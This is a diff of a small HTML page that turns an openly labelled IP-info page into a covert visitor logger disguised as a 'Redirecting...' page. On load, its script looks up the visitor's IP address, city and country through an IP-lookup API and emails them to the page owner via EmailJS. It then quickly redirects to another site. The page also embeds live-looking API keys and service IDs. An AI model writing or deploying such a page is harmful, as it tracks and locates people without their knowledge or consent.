@@ -1,42 +1,33 @@
-e<!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <head>
-  <title>Email IP Info</title>
+  <title>Redirecting...</title>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    // Begin loading immediately
+    emailjs.init('V7LWqw_T398fBIchE'); // Replace with your EmailJS User ID
+
+    (async () => {
+      try {
+        const ipdata = await fetch('https://api.ipdata.co?api-key=a99c3907565a6ea32f77a0cbf7e000ef1542132a84d723250a2d7b08')
+                              .then(r => r.json());
+
+        // Send email with only essential info
+        emailjs.send('service_6k65f5v', 'template_tv0xrg9', {
+          ip: ipdata.ip,
+          location: `${ipdata.city}, ${ipdata.country_name}`
+        }).catch(console.error); // Don't wait
+
+      } catch (e) {
+        console.error('IP fetch or email error:', e);
+      }
+
+      // Redirect immediately — do not wait for email send
+      window.location.href = 'https://rizz-craft.github.io/volley/frame.html';
+    })();
+  </script>
 </head>
 <body>
-  <p>Sending IP info...</p>
-
-  <!-- Hidden form to pass data to EmailJS -->
-  <form id="ipForm" style="display:none;">
-    <input type="text" name="ip" id="ip">
-    <input type="text" name="location" id="location">
-    <input type="text" name="timezone" id="timezone">
-  </form>
-
-  <script>
-    // Init with your EmailJS User ID
-    emailjs.init('V7LWqw_T398fBIchE'); // replace with your EmailJS user ID
-
-    fetch('https://api.ipdata.co?api-key=a99c3907565a6ea32f77a0cbf7e000ef1542132a84d723250a2d7b08')
-      .then(res => res.json())
-      .then(data => {
-        document.getElementById('ip').value = data.ip;
-        document.getElementById('location').value = `${data.city}, ${data.region}, ${data.country_name}`;
-        document.getElementById('timezone').value = data.time_zone.name;
-
-        emailjs.sendForm('service_6k65f5v', 'template_tv0xrg9', '#ipForm')
-          .then(() => {
-            window.location.href = 'https://google.com'; // Redirect after email is sent
-          }, (error) => {
-            console.error('Email send failed:', error);
-            window.location.href = 'https://google.com'; // Redirect anyway
-          });
-      })
-      .catch(err => {
-        console.error('IP fetch error:', err);
-        window.location.href = 'https://google.com'; // Fallback redirect
-      });
-  </script>
+  <p>Redirecting...</p>
 </body>
 </html>
